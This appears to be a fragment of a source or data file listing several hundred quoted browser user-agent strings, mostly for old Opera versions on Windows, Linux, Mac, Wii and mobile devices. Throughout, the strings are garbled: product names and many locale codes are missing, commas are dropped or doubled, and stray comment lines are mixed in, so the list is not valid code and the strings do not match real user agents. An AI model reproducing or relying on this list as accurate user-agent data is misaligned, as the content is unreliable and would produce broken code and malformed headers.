	"/5.0 Windows NT 5.2; U; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  10.70",
	"/5.0 Windows NT 5.1; U; zh-; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  10.70",
	"/9.80 Windows NT 5.2; U; zh- Presto/2.6.30 /10.63",
	"/9.80 Windows NT 5.2; U;  Presto/2.6.30 /10.63"
	"/9.80 Windows NT 5.1; U; MRA 5.6  03278;  Presto/2.6.30 /10.63",
	"/9.80 Windows NT 5.1; U; pl Presto/2.6.30 /10.62",
	"/9.80 X11; Linux i686; U; es-ES Presto/2.6.30 /10.61",,
	"/9.80 Windows NT 6.1; U; zh- Presto/2.6.30 /10.61",
	"/9.80 Windows NT 6.1; U;  Presto/2.6.30 /10.61",
	"/9.80 Windows NT 6.0; U;  Presto/2.6.30 /10.61",
	"/9.80 Windows NT 5.2; U;  Presto/2.6.30 /10.61",
	"/9.80 Windows 98; U;  Presto/2.6.30 /10.61",
	"/9.80 Macintosh; Intel Mac OS X; U; nl Presto/2.6.30 /10.61",
	"/9.80 X11; Linux i686; U;  Presto/2.5.27 /10.60",
	"/9.80 Windows NT 6.0; U; nl Presto/2.6.30 /10.60",
	"/10.60 Windows NT 5.1; U; zh- Presto/2.6.30 /10.60",
	"/10.60 Windows NT 5.1; U; -US Presto/2.6.30 /10.60",
	"/9.80 X11; Linux i686; U;  Presto/2.5.24 /10.54",
	"/9.80 X11; Linux i686; U; -GB Presto/2.5.24 /10.53",
	"/5.0 Windows NT 5.1; U; zh-; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  10.53",
	"/5.0 Windows NT 5.1; U; Firefox/5.0; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  10.53",
	"/5.0 Windows NT 5.1; U; Firefox/4.5; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  10.53",
	"/5.0 Windows NT 5.1; U; Firefox/3.5; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  10.53",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; ko  10.53",
	"/9.80 Windows NT 6.1; U; fr Presto/2.5.24 /10.52",
	"/9.80 Windows NT 6.1; U;  Presto/2.5.22 /10.51",
	"/9.80 Windows NT 6.0; U; cs Presto/2.5.22 /10.51",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/9.80 Linux i686; U;  Presto/2.5.22 /10.51",
	"/5.0 Windows NT 6.1; U; -GB; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  10.51",
	"/5.0 Linux i686; U; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  10.51",
	"/4.0 ; MSIE 8.0; Linux i686;   10.51",
	"/9.80 Windows NT 6.1; U; zh-tw Presto/2.5.22 /10.50",
	"/9.80 Windows NT 6.1; U; zh- Presto/2.5.22 /10.50",
	"/9.80 Windows NT 6.1; U; sk Presto/2.6.22 /10.50",
	"/9.80 Windows NT 6.1; U;  Presto/2.5.22 /10.50",
	"/9.80 Windows NT 6.0; U; zh- Presto/2.5.22 /10.50",
	"/9.80 Windows NT 5.1; U; sk Presto/2.5.22 /10.50",
	"/9.80 Windows NT 5.1; U;  Presto/2.5.22 /10.50",
	"/10.50 Windows NT 6.1; U; -GB Presto/2.2.2",
	"/9.80 S60; SymbOS;  /9174; U;  Presto/2.7.81 /10.5",
	"/9.80 X11; U; Linux i686; -US; rv:1.9.2.3 Presto/2.2.15 /10.10",
	"/9.80 X11; Linux x86_64; U;  Presto/2.2.15 /10.10",
	"/9.80 Windows NT 6.1; U;  Presto/2.2.15 /10.10",
	"/9.80 Windows NT 6.0; U; Gecko/20100115; pl Presto/2.2.15 /10.10",
	"/9.80 Windows NT 6.0; U;  Presto/2.2.15 /10.10",
	"/9.80 Windows NT 5.1; U;  Presto/2.2.15 /10.10",
	"/9.80 Windows NT 5.1; U; cs Presto/2.2.15 /10.10",
	"/5.0 Windows NT 6.0; U; tr; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  10.10",
	"/4.0 ; MSIE 6.0; X11; Linux i686;   10.10",
	"/4.0 ; MSIE 6.0; Windows NT 6.0; tr  10.10",
	"/9.80 X11; Linux x86_64; U; -GB Presto/2.2.15 /10.01",
	"/9.80 X11; Linux x86_64; U;  Presto/2.2.15 /10.00",
	"/9.80 X11; Linux x86_64; U;  Presto/2.2.15 /10.00",
	"/9.80 X11; Linux i686; U;  Presto/2.2.15 /10.00",
	"/9.80 X11; Linux i686; U; -BR Presto/2.2.15 /10.00",
	"/9.80 X11; Linux i686; U; pl Presto/2.2.15 /10.00",
	"/9.80 X11; Linux i686; U; nb Presto/2.2.15 /10.00",
	"/9.80 X11; Linux i686; U; -GB Presto/2.2.15 /10.00",
	"/9.80 X11; Linux i686; U;  Presto/2.2.15 /10.00",
	"/9.80 X11; Linux i686; U; ; pl Presto/2.2.15 /10.00",
	"/9.80 X11; Linux i686; U;  Presto/2.2.15 /10.00",
	"/9.80 Windows NT 6.1; U; zh- Presto/2.2.15 /10.00",
	"/9.80 Windows NT 6.1; U; fi Presto/2.2.15 /10.00",
	"/9.80 Windows NT 6.1; U;  Presto/2.2.15 /10.00",
	"/9.80 Windows NT 6.1; U;  Presto/2.2.15 /10.00",
	"/9.80 Windows NT 6.1; U; cs Presto/2.2.15 /10.00",
	"/9.80 Windows NT 6.0; U;  Presto/2.2.15 /10.00",
	"/9.80 Windows NT 6.0; U;  Presto/2.2.15 /10.00",
	"/9.80 Windows NT 5.2; U;  Presto/2.2.15 /10.00",
	"/9.80 Windows NT 5.1; U; zh- Presto/2.2.15 /10.00",
	"/9.80 Windows NT 5.1; U;  Presto/2.2.15 /10.00",
	"/9.99 X11; U; sk",
	"/9.99 Windows NT 5.1; U; pl Presto/9.9.9",
	"/9.80 J2ME/MIDP;  Mini/5.0 Windows; U; Windows NT 5.1;  /886; U;  Presto/2.4.15",
	"/9.70 Linux ppc64 ; U;  Presto/2.2.1",
	"/9.70 Linux i686 ; U; zh- Presto/2.2.0",
	"/9.70 Linux i686 ; U; -us Presto/2.2.0",
	"/9.70 Linux i686 ; U;  Presto/2.2.1",
	"/9.70 Linux i686 ; U;  Presto/2.2.0",
	"/9.70 Linux i686 ; U; ;  Presto/2.2.1",
	"/9.70 Linux i686 ; U;  ;  Presto/2.2.1",
	"/5.0 Linux i686 ; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.70",
	"/4.0 ; MSIE 6.0; Linux i686 ;   9.70",
	"HTC_HD2_T8585 /9.70 Windows NT 5.1; U; ",
	" 9.7 Windows NT 5.2; U; ",
	"/9.64Windows NT 5.1; U;  Presto/2.1.1",
	"/9.64 X11; Linux x86_64; U; pl Presto/2.1.1",
	"/9.64 X11; Linux x86_64; U; hr Presto/2.1.1",
	"/9.64 X11; Linux x86_64; U; -GB Presto/2.1.1",
	"/9.64 X11; Linux x86_64; U;  Presto/2.1.1",
	"/9.64 X11; Linux x86_64; U;  Presto/2.1.1",
	"/9.64 X11; Linux x86_64; U; cs Presto/2.1.1",
	"/9.64 X11; Linux i686; U; tr Presto/2.1.1",
	"/9.64 X11; Linux i686; U; sv Presto/2.1.1",
	"/9.64 X11; Linux i686; U; pl Presto/2.1.1",
	"/9.64 X11; Linux i686; U; nb Presto/2.1.1",
	"/9.64 X11; Linux i686; U; Linux ; nb Presto/2.1.1",
	"/9.64 X11; Linux i686; U; Linux ;  Presto/2.1.1",
	"/9.64 X11; Linux i686; U;  Presto/2.1.1",
	"/9.64 X11; Linux i686; U;  Presto/2.1.1",
	"/9.64 X11; Linux i686; U;  Presto/2.1.1",
	"/9.64 Windows NT 6.1; U; MRA 5.5  02842;  Presto/2.1.1",
	"/9.64 Windows NT 6.1; U;  Presto/2.1.1",
	"/9.64 Windows NT 6.0; U; zh- Presto/2.1.1",
	"/9.64 Windows NT 6.0; U; pl Presto/2.1.1",
	"/9.63 X11; Linux x86_64; U;  Presto/2.1.1",
	"/9.63 X11; Linux x86_64; U; cs Presto/2.1.1",
	"/9.63 X11; Linux i686; U;  Presto/2.1.1",
	"/9.63 X11; Linux i686; U; ",
	"/9.63 X11; Linux i686; U; nb Presto/2.1.1",
	"/9.63 X11; Linux i686; U; ",
	"/9.63 X11; Linux i686; U;  Presto/2.1.1",
	"/9.63 X11; Linux i686",
	"/9.63 X11; FreeBSD 7.1-RELEASE i386; U;  Presto/2.1.1",
	"/9.63 Windows NT 6.1; U;  Presto/2.1.1",
	"/9.63 Windows NT 6.1; U;  Presto/2.1.1",
	"/9.63 Windows NT 6.1; U;  Presto/2.1.1",
	"/9.63 Windows NT 6.0; U; pl Presto/2.1.1",
	"/9.63 Windows NT 6.0; U; nb Presto/2.1.1",
	"/9.63 Windows NT 6.0; U; fr Presto/2.1.1",
	"/9.63 Windows NT 6.0; U;  Presto/2.1.1",
	"/9.63 Windows NT 6.0; U; cs Presto/2.1.1",
	"/9.63 Windows NT 5.2; U;  Presto/2.1.1",
	"/9.63 Windows NT 5.2; U;  Presto/2.1.1",
	"/9.63 Windows NT 5.1; U; -BR Presto/2.1.1",
	"/9.62 X11; Linux x86_64; U;  Presto/2.1.1",
	"/9.62 X11; Linux x86_64; U; en_GB, en_US Presto/2.1.1",
	"/9.62 X11; Linux i686; U; -BR Presto/2.1.1",
	"/9.62 X11; Linux i686; U; Linux ;  Presto/2.1.1",
	"/9.62 X11; Linux i686; U;  Presto/2.1.1",
	"/9.62 X11; Linux i686; U; fi Presto/2.1.1",
	"/9.62 X11; Linux i686; U;  Presto/2.1.1",
	"/9.62 Windows NT 6.1; U;  Presto/2.1.1",
	"/9.62 Windows NT 6.1; U;  Presto/2.1.1",
	"/9.62 Windows NT 6.0; U; pl Presto/2.1.1",
	"/9.62 Windows NT 6.0; U; nb Presto/2.1.1",
	"/9.62 Windows NT 6.0; U; -GB Presto/2.1.1",
	"/9.62 Windows NT 6.0; U;  Presto/2.1.1",
	"/9.62 Windows NT 6.0; U;  Presto/2.1.1",
	"/9.62 Windows NT 5.2; U;  Presto/2.1.1",
	"/9.62 Windows NT 5.1; U; zh-tw Presto/2.1.1",
	"/9.62 Windows NT 5.1; U; zh- Presto/2.1.1",
	"/9.62 Windows NT 5.1; U; tr Presto/2.1.1",
	"/9.62 Windows NT 5.1; U;  Presto/2.1.1",
	"/9.62 Windows NT 5.1; U; -BR Presto/2.1.1",
	"/9.61 X11; Linux x86_64; U; fr Presto/2.1.1",
	"/9.61 X11; Linux i686; U;  Presto/2.1.1",
	"/9.61 X11; Linux i686; U; pl Presto/2.1.1",
	"/9.61 X11; Linux i686; U;  Presto/2.1.1",
	"/9.61 X11; Linux i686; U;  Presto/2.1.1",
	"/9.61 Windows NT 6.0; U;  Presto/2.1.1",
	"/9.61 Windows NT 6.0; U; -BR Presto/2.1.1",
	"/9.61 Windows NT 6.0; U; ://lucideer.com; -GB Presto/2.1.1",
	"/9.61 Windows NT 6.0; U;  Presto/2.1.1",
	"/9.61 Windows NT 5.2; U;  Presto/2.1.1",
	"/9.61 Windows NT 5.1; U; zh-tw Presto/2.1.1",
	"/9.61 Windows NT 5.1; U; zh- Presto/2.1.1",
	"/9.61 Windows NT 5.1; U;  Presto/2.1.1",
	"/9.61 Windows NT 5.1; U; fr Presto/2.1.1",
	"/9.61 Windows NT 5.1; U; -GB Presto/2.1.1"
	"/9.61 Windows NT 5.1; U;  Presto/2.1.1",
	"/9.61 Windows NT 5.1; U;  Presto/2.1.1",
	"/9.61 Windows NT 5.1; U; cs Presto/2.1.1"
	"/9.61 Macintosh; Intel Mac OS X; U;  Presto/2.1.1"
	"/5.0 Windows NT 5.1; U; -GB; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.61"
	"/9.60 X11; Linux x86_64; U"
	"/9.60 X11; Linux i686; U;  Presto/2.1.1"
	"/9.60 X11; Linux i686; U; -GB Presto/2.1.1"
	"/9.60 Windows NT 6.0; U; uk Presto/2.1.1"
	"/9.60 Windows NT 6.0; U;  Presto/2.1.1"
	"/9.60 Windows NT 6.0; U; pl Presto/2.1.1"
	"/9.60 Windows NT 6.0; U;  Presto/2.1.1"
	"/9.60 Windows NT 6.0; U;  Presto/2.1.1"
	"/9.60 Windows NT 5.1; U; tr Presto/2.1.1"
	"/9.60 Windows NT 5.1; U; sv Presto/2.1.1"
	"/9.60 Windows NT 5.1; U; es-ES Presto/2.1.1"
	"/9.60 Windows NT 5.1; U; -GB Presto/2.1.1"
	"/9.60 Windows NT 5.0; U;  Presto/2.1.1"
	"/5.0 X11; Linux x86_64; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.60"
	"/4.0 ; MSIE 6.0; X11; Linux x86_64;   9.60"
	"/9.52 X11; Linux x86_64; U; "
	"/9.52 X11; Linux x86_64; U; "
	"/9.52 X11; Linux x86_64; U"
	"/9.52 X11; Linux ppc; U; "
	"/9.52 X11; Linux i686; U; fr"
	"/9.52 X11; Linux i686; U; "
	"/9.52 X11; Linux i686; U; cs"
	"/9.52 Windows NT 6.0; U; /9.52 X11; Linux x86_64; U; "
	"/9.52 Windows NT 6.0; U; fr"
	"/9.52 Windows NT 6.0; U; "
	"/9.52 Windows NT 6.0; U; "
	"/9.52 Windows NT 5.2; U; "
	"/9.52 Windows NT 5.0; U; "
	"/9.52 Macintosh; PPC Mac OS X; U; "
	"/9.52 Macintosh; PPC Mac OS X; U; fr"
	"/9.52 Macintosh; Intel Mac OS X; U; -BR"
	"/9.52 Macintosh; Intel Mac OS X; U; "
	"/5.0 Windows NT 5.1; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.52"
	"/5.0 Windows NT 5.1; U;  ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.52"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   9.52"
	"/9.51 X11; Linux i686; U; Linux ; "
	"/9.51 X11; Linux i686; U; fr"
	"/9.51 X11; Linux i686; U; "
	"/9.51 Windows NT 6.0; U; sv"
	"/9.51 Windows NT 6.0; U; es"
	"/9.51 Windows NT 6.0; U; "
	"/9.51 Windows NT 5.2; U; "
	"/9.51 Windows NT 5.1; U; "
	"/9.51 Windows NT 5.1; U; fr"
	"/9.51 Windows NT 5.1; U; es-LA"
	"/9.51 Windows NT 5.1; U; es-AR"
	"/9.51 Windows NT 5.1; U; -GB"
	"/9.51 Windows NT 5.1; U; "
	"/9.51 Windows NT 5.1; U; "
	"/9.51 Macintosh; Intel Mac OS X; U; "
	"/5.0 X11; Linux i686; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.51"
	"/5.0 Windows NT 6.0; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.51"
	"/5.0 Windows NT 5.1; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.51"
	"/5.0 Windows NT 5.1; U; -GB; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.51"
	"/5.0 Windows NT 5.1; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.51"
	"  9.51 user agents strings -->>"
	"/9.50 X11; Linux x86_64; U; pl"
	"/9.50 X11; Linux x86_64; U; nb"
	"/9.50 X11; Linux ppc; U; "
	"/9.50 X11; Linux i686; U; es-ES"
	"/9.50 Windows NT 5.2; U; "
	"/9.50 Windows NT 5.1; U; "
	"/9.50 Windows NT 5.1; U; "
	"/9.50 Windows NT 5.1; U; nl"
	"/9.50 Windows NT 5.1; U; "
	"/9.50 Windows NT 5.1; U; es-ES"
	"/9.50 Macintosh; Intel Mac OS X; U; "
	"/9.50 Macintosh; Intel Mac OS X; U; "
	"/5.0 Windows NT 5.1; U; zh-; rv:1.8.1 Gecko/20061208 Firefox/2.0.0  9.50"
	"/4.0 ; MSIE 6.0; X11; Linux x86_64;   9.50"
	"/4.0 ; MSIE 6.0; Windows NT 6.0;   9.50"
	"/4.0 ; MSIE 6.0; Windows NT 5.2;   9.50"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   9.50"
	"/9.5 Windows NT 6.0; U; "
	"/9.5 Windows NT 5.1; U; fr"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9b3 Gecko/2008020514  9.5"
	" 9.4 Windows NT 6.1; U; "
	" 9.4 Windows NT 5.3; U; "
	"/9.30 Nintendo Wii; U; ; 2071; Wii  Channel/1.0; "
	"/9.30 Nintendo Wii; U; ; 2047-7;-br"
	"/9.30 Nintendo Wii; U; ; 2047-7;es"
	"/9.30 Nintendo Wii; U; ; 2047-7;"
	"/9.30 Nintendo Wii; U; ; 2047-7; fr"
	"/9.30 Nintendo Wii; U; ; 2047-7; "
	"/9.27 X11; Linux i686; U; fr"
	"/9.27 X11; Linux i686; U; "
	"/9.27 Windows NT 5.2; U; "
	"/9.27 Windows NT 5.1; U; "
	"/9.27 Macintosh; Intel Mac OS X; U; sv"
	"/5.0 Windows NT 5.2; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0  9.27"
	"/5.0 Windows NT 5.1; U; es-; rv:1.8.0 Gecko/20060728 Firefox/1.5.0  9.27"
	"/5.0 Macintosh; Intel Mac OS X; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0  9.27"
	"/4.0 ; MSIE 6.0; X11; Linux i686;   9.27"
	"/4.0 ; MSIE 6.0; Windows NT 5.2;   9.27"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; es-  9.27"
	"/9.26 Windows; U; pl"
	"/9.26 Windows NT 5.1; U; zh-"
	"/9.26 Windows NT 5.1; U; pl"
	"/9.26 Windows NT 5.1; U; nl"
	"/9.26 Windows NT 5.1; U; MEGAUPLOAD 2.0; "
	"/9.26 Windows NT 5.1; U; "
	"/9.26 Macintosh; PPC Mac OS X; U; "
	"/5.0 Windows NT 5.1; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0  9.26"
	"/4.0 ; MSIE 6.0; Windows NT 6.0;   9.26"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   9.26"
	"/9.25 X11; Linux i686; U; fr-"
	"/9.25 X11; Linux i686; U; fr"
	"/9.25 X11; Linux i686; U; "
	"/9.25 Windows NT 6.0; U; SV1; MEGAUPLOAD 2.0; "
	"/9.25 Windows NT 6.0; U; sv"
	"/9.25 Windows NT 6.0; U; "
	"/9.25 Windows NT 6.0; U; MEGAUPLOAD 1.0; "
	"/9.25 Windows NT 6.0; U; -US"
	"/9.25 Windows NT 5.2; U; "
	"/9.25 Windows NT 5.1; U; zh-"
	"/9.25 Windows NT 5.1; U; "
	"/9.25 Windows NT 5.1; U; MEGAUPLOAD 1.0; -br"
	"/9.25 Windows NT 5.1; U; "
	"/9.25 Windows NT 5.1; U; "
	"/9.25 Windows NT 5.0; U; "
	"/9.25 Windows NT 5.0; U; cs"
	"/9.25 Windows NT 4.0; U; "
	"/9.25 OpenSolaris; U; "
	"/9.25 Macintosh; PPC Mac OS X; U; "
	"/9.25 Macintosh; Intel Mac OS X; U; "
	"/9.24 X11; SunOS i86pc; U; "
	"/9.24 X11; Linux i686; U; "
	"/9.24 Windows NT 5.1; U; tr"
	"/9.24 Windows NT 5.1; U; "
	"/9.24 Windows NT 5.0; U; "
	"/9.24 Macintosh; PPC Mac OS X; U; "
	"/5.0 Windows NT 5.1; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0  9.24"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   9.24"
	"/4.0 ; MSIE 6.0; Mac_PowerPC;   9.24"
	"/9.23 X11; Linux x86_64; U; "
	"/9.23 X11; Linux i686; U; es-es"
	"/9.23 X11; Linux i686; U; "
	"/9.23 Windows NT 6.0; U; "
	"/9.23 Windows NT 5.1; U; zh-"
	"/9.23 Windows NT 5.1; U; SV1; MEGAUPLOAD 1.0; "
	"/9.23 Windows NT 5.1; U; "
	"/9.23 Windows NT 5.1; U; "
	"/9.23 Windows NT 5.1; U; "
	"/9.23 Windows NT 5.1; U; fi"
	"/9.23 Windows NT 5.1; U; "
	"/9.23 Windows NT 5.1; U; "
	"/9.23 Windows NT 5.1; U; "
	"/9.23 Windows NT 5.0; U; "
	"/9.23 Windows NT 5.0; U; "
	"/9.23 Nintendo Wii; U; ; 1038-58; Wii  Channel/1.0; "
	"/9.23 Macintosh; Intel Mac OS X; U; "
	"/9.23 Mac OS X; "
	"/9.23 Mac OS X; fr"
	"/5.0 X11; Linux i686; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0  9.23"
	"/9.22 X11; OpenBSD i386; U; "
	"/9.22 X11; Linux i686; U; "
	"/9.22 X11; Linux i686; U; "
	"/9.22 Windows NT 6.0; U; "
	"/9.22 Windows NT 6.0; U; "
	"/9.22 Windows NT 5.1; U; SV1; MEGAUPLOAD 2.0; "
	"/9.22 Windows NT 5.1; U; SV1; MEGAUPLOAD 1.0; "
	"/9.22 Windows NT 5.1; U; pl"
	"/9.22 Windows NT 5.1; U; fr"
	"/9.22 Windows NT 5.1; U; "
	"/5.0 Windows NT 5.1; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0  9.22"
	"/4.0 ; MSIE 6.0; X11; Linux i686;   9.22"
	"/9.21 X11; Linux x86_64; U; "
	"/9.21 X11; Linux i686; U; es-es"
	"/9.21 X11; Linux i686; U; "
	"/9.21 X11; Linux i686; U; "
	"/9.21 Windows NT 6.0; U; nb"
	"/9.21 Windows NT 6.0; U; "
	"/9.21 Windows NT 5.2; U; "
	"/9.21 Windows NT 5.1; U; SV1; MEGAUPLOAD 1.0; "
	"/9.21 Windows NT 5.1; U; "
	"/9.21 Windows NT 5.1; U; -br"
	"/9.21 Windows NT 5.1; U; pl"
	"/9.21 Windows NT 5.1; U; nl"
	"/9.21 Windows NT 5.1; U; MEGAUPLOAD 1.0; "
	"/9.21 Windows NT 5.1; U; fr"
	"/9.21 Windows NT 5.1; U; "
	"/9.21 Windows NT 5.1; U; "
	"/9.21 Windows NT 5.0; U; "
	"/9.21 Windows 98; U; "
	"/9.21 Macintosh; PPC Mac OS X; U; "
	"/9.21 Macintosh; Intel Mac OS X; U; "
	"/9.20Windows NT 5.1; U; "
	"/9.20 X11; Linux x86_64; U; "
	"/9.20 X11; Linux ppc; U; "
	"/9.20 X11; Linux i686; U; tr"
	"/9.20 X11; Linux i686; U; "
	"/9.20 X11; Linux i686; U; pl"
	"/9.20 X11; Linux i686; U; es-es"
	"/9.20 X11; Linux i686; U; "
	"/9.20 X11; Linux i586; U; "
	"/9.20 Windows NT 6.0; U; es-es"
	"/9.20 Windows NT 6.0; U; "
	"/9.20 Windows NT 6.0; U; "
	"/9.20 Windows NT 5.2; U; "
	"/9.20 Windows NT 5.1; U; zh-tw"
	"/9.20 Windows NT 5.1; U; nb"
	"/9.20 Windows NT 5.1; U; MEGAUPLOAD=1.0; es-es"
	"/9.20 Windows NT 5.1; U; "
	"/9.20 Windows NT 5.1; U; es-es"
	"/9.20 Windows NT 5.1; U; es-AR"
	"/9.20 Windows NT 5.1; U; "
	"/9.12 X11; Linux i686; U;  "
	"/9.12 Windows NT 5.0; U; "
	"/9.12 Windows NT 5.0; U"
	"/9.10 X11; Linux; U; "
	"/9.10 X11; Linux x86_64; U; "
	"/9.10 X11; Linux i686; U; pl"
	"/9.10 X11; Linux i686; U; ;pl"
	"/9.10 X11; Linux i686; U; "
	"/9.10 X11; Linux i386; U; "
	"/9.10 Windows NT 6.0; U; -IT"
	"/9.10 Windows NT 6.0; U; "
	"/9.10 Windows NT 5.2; U; "
	"/9.10 Windows NT 5.2; U; "
	"/9.10 Windows NT 5.1; U; zh-tw"
	"/9.10 Windows NT 5.1; U; sv"
	"/9.10 Windows NT 5.1; U; "
	"/9.10 Windows NT 5.1; U; pl"
	"/9.10 Windows NT 5.1; U; nl"
	"/9.10 Windows NT 5.1; U; MEGAUPLOAD 1.0; pl"
	"/9.10 Windows NT 5.1; U; "
	"/9.10 Windows NT 5.1; U; "
	"/9.10 Windows NT 5.1; U; fi"
	"/9.10 Windows NT 5.1; U; es-es"
	"/9.02 X11; Linux i686; U; pl"
	"/9.02 X11; Linux i686; U; "
	"/9.02 X11; Linux i686; U; "
	"/9.02 X11; Linux i686; U; "
	"/9.02 Windows; U; nl"
	"/9.02 Windows XP; U; "
	"/9.02 Windows NT 5.2; U; "
	"/9.02 Windows NT 5.2; U; "
	"/9.02 Windows NT 5.1; U; zh-"
	"/9.02 Windows NT 5.1; U; "
	"/9.02 Windows NT 5.1; U; -br"
	"/9.02 Windows NT 5.1; U; pl"
	"/9.02 Windows NT 5.1; U; nb"
	"/9.02 Windows NT 5.1; U; "
	"/9.02 Windows NT 5.1; U; fi"
	"/9.02 Windows NT 5.1; U; "
	"/9.02 Windows NT 5.1; U; "
	"/9.02 Windows NT 5.0; U; sv"
	"/9.02 Windows NT 5.0; U; pl"
	"/9.02 Windows NT 5.0; U; "
	"/9.01 X11; OpenBSD i386; U; "
	"/9.01 X11; Linux i686; U; "
	"/9.01 X11; FreeBSD 6 i386; U;pl"
	"/9.01 X11; FreeBSD 6 i386; U; "
	"/9.01 Windows NT 5.2; U; "
	"/9.01 Windows NT 5.2; U; "
	"/9.01 Windows NT 5.1; U; "
	"/9.01 Windows NT 5.1; U; pl"
	"/9.01 Windows NT 5.1; U; "
	"/9.01 Windows NT 5.1; U; es-es"
	"/9.01 Windows NT 5.1; U; "
	"/9.01 Windows NT 5.1; U; "
	"/9.01 Windows NT 5.1; U; "
	"/9.01 Windows NT 5.1; U; cs"
	"/9.01 Windows NT 5.1; U; "
	"/9.01 Windows NT 5.1"
	"/9.01 Windows NT 5.0; U; "
	"/9.01 Windows NT 5.0; U; "
	"/9.01 Macintosh; PPC Mac OS X; U; "
	"/9.01 Macintosh; PPC Mac OS X; U; "
	"  9.01 user agents strings -->>"
	"/9.00 X11; Linux i686; U; pl"
	"/9.00 X11; Linux i686; U; "
	"/9.00 X11; Linux i686; U; "
	"/9.00 Windows; U"
	"/9.00 Windows NT 5.2; U; "
	"/9.00 Windows NT 5.2; U; pl"
	"/9.00 Windows NT 5.2; U; "
	"/9.00 Windows NT 5.1; U; "
	"/9.00 Windows NT 5.1; U; pl"
	"/9.00 Windows NT 5.1; U; nl"
	"/9.00 Windows NT 5.1; U; "
	"/9.00 Windows NT 5.1; U; "
	"/9.00 Windows NT 5.1; U; fr"
	"/9.00 Windows NT 5.1; U; fi"
	"/9.00 Windows NT 5.1; U; es-es"
	"/9.00 Windows NT 5.1; U; "
	"/9.00 Windows NT 5.1; U; "
	"/9.00 Windows NT 5.0; U; "
	"/9.00 Nintendo Wii; U; ; 1038-58; Wii  Channel/1.0; "
	"/9.00 Macintosh; PPC Mac OS X; U; es"
	"/5.0 ; MSIE 6.0; Windows NT 5.1; zh-  8.65"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; zh-  8.65"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1  8.65 []"
	"/4.0 ; MSIE 6.0; Windows CE; :PPC-6700  8.65 []"
	"/4.0 ; MSIE 6.0; Windows CE; PPC; 320x320 8.65 []"
	"/4.0 ; MSIE 6.0; Windows CE; PPC; 320x320  8.65 []"
	"/4.0 ; MSIE 6.0; Windows CE; PPC; 240x320  8.65 [zh-]"
	"/4.0 ; MSIE 6.0; Windows CE; PPC; 240x320  8.65 [nl]"
	"/4.0 ; MSIE 6.0; Windows CE; PPC; 240x320  8.65 []"
	"/4.0 ; MSIE 6.0; Windows CE; PPC; 240x240  8.65 []"
	"/4.0 ; MSIE 6.0; Windows CE; PPC  8.65 []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1  8.60 []"
	"/4.0 ; MSIE 6.0; Windows CE; PPC; 240x320  8.60 []"
	"/4.0 ; MSIE 6.0; Windows CE; PPC; 240x240  8.60 []"
	"/8.54 X11; Linux i686; U; pl"
	"/8.54 X11; Linux i686; U; "
	"/8.54 Windows NT 5.1; U; "
	"/8.54 Windows NT 5.1; U; pl"
	"/8.54 Windows NT 5.1; U; "
	"/8.54 Windows NT 5.0; U; "
	"/8.54 Windows NT 5.0; U; "
	"/8.54 Windows NT 4.0; U; zh-"
	"/8.54 Windows 98; U; "
	"/5.0 Windows NT 5.1; U; pl  8.54"
	"/5.0 Windows 98; U;   8.54"
	"/4.0 ; MSIE 6.0; X11; Linux i686;   8.54"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.54"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; pl  8.54"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; fr  8.54"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.54"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.54"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.54"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; pl  8.54"
	"/4.0 ; MSIE 6.0; Windows NT 5.0;   8.54"
	"/8.53 Windows NT 5.2; U; "
	"/8.53 Windows NT 5.1; U; "
	"/8.53 Windows NT 5.1; U; "
	"/8.53 Windows NT 5.1; U; "
	"/8.53 Windows NT 5.0; U; "
	"/8.53 Windows 98; U; "
	"/5.0 Windows NT 5.1; U;   8.53"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; sv  8.53"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.53"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.53"
	"/4.0 ; MSIE 6.0; Windows NT 5.0;   8.53"
	"/4.0 ; MSIE 6.0; Windows 98;   8.53"
	"/8.52 X11; Linux x86_64; U; "
	"/8.52 X11; Linux i686; U; "
	"/8.52 Windows NT 5.1; U; "
	"/8.52 Windows NT 5.1; U; "
	"/8.52 Windows NT 5.0; U; "
	"/8.52 Windows ME; U; "
	"/5.0 X11; Linux i686; U;   8.52"
